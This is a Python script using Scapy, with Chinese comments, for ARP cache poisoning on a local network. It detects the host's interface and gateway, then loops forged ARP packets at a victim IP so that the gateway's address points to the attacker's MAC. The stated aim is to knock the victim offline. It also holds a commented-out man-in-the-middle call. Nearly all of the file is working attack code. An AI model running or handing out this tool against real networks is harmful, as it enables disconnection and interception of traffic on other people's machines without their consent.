import scapy
import re
from scapy.layers.inet import Ether
from scapy.layers.l2 import ARP, arpcachepoison, arp_mitm
from scapy.all import ifaces, conf, srp, get_if_addr, get_if_hwaddr, sendp
import time


def get_real_iface_name():
    # 从ifaces命令打印结果里，按行解析每行的属性（第一行为属性行），结果放入字典的列表iface_dict_list
    iface_dict_list, iface_keys = [], []
    for idx, line in enumerate(str(ifaces).split('\n')):
        items_in_line = list(filter(None, re.split(r'\s{2,}', line)))  # 每行里面有2个及以上空格进行分割
        if len(items_in_line) < 2:
            continue
        if idx == 0:
            iface_keys = items_in_line
        else:
            iface_dict = {}
            for i, key in enumerate(iface_keys):
                if i < len(items_in_line):
                    iface_dict[key] = items_in_line[i]
            iface_dict_list.append(iface_dict)

    ignore_keywords = ['virtual', 'miniport', 'loopback', 'vmware']
    real_iface_list = list(filter(
        lambda iface: all([False if keyword in iface['Name'].lower() else True for keyword in ignore_keywords]),
        iface_dict_list))
    real_iface_name = real_iface_list[0]['Name']
    return real_iface_name


def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:  # 返回从响应数据中获取的Mac地址
        return r[Ether].src
    return None


# 获取网关IP地址，参考：https://scapy.readthedocs.io/en/latest/routing.html#get-mac-by-ip
def get_gateway_ip():
    return conf.route.route('0.0.0.0')[2]


# a simplified version of method arpcachepoison() in scapy.layers.l2 package
def arpcachepoison1(target_ip, ip_mac_couple_to_usurp, interval=15):
    print('将ip为{}的ARP缓存中的对应项目进行篡改：{}'.format(target_ip, ip_mac_couple_to_usurp))
    ip_to_usurp, mac_to_usurp = ip_mac_couple_to_usurp
    p = Ether(src=mac_to_usurp) / ARP(op="who-has", psrc=ip_to_usurp, pdst=target_ip,
                                      hwsrc=mac_to_usurp, hwdst="ff:ff:ff:ff:ff:ff")
    print(p)
    try:
        while True:
            sendp(p, iface_hint=target_ip)
            time.sleep(interval)
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    print('-' * 65)
    print('Scapy version {}, using iface "{}"'.format(scapy.VERSION, get_real_iface_name()))
    print('本机IP地址：\t {:<20}'.format(get_if_addr(get_real_iface_name())))
    print('本地MAC地址：\t {:<20}'.format(get_if_hwaddr(get_real_iface_name())))
    print('默认网关地址：\t {:<20}'.format(get_gateway_ip()))
    print('-' * 65)
    # print(conf.iface)
    # print(get_mac('192.168.68.1'))
    # 将"受害者IP"主机的ARP缓存中，将网关IP对应的MAC地址篡改为本机MAC地址，从而使其断网
    arpcachepoison1('192.168.68.163', (get_gateway_ip(), get_if_hwaddr(get_real_iface_name())),
                    interval=1)
    # print(type(conf.route.route('0.0.0.0')[2]))
    # print(conf.route)

    # print('192.168.68.163的MAC地址是：',get_mac('192.168.68.163'))
    # print('网关{}的MAC地址是：{}'.format(get_gateway_ip(), get_mac(get_gateway_ip())) )

    # arp_mitm('192.168.68.163', get_gateway_ip(), '58:fb:84:47:90:af', 'dc:d8:7c:13:a1:ab',
    #          get_if_hwaddr(get_real_iface_name()), iface=get_real_iface_name(), inter=1)
#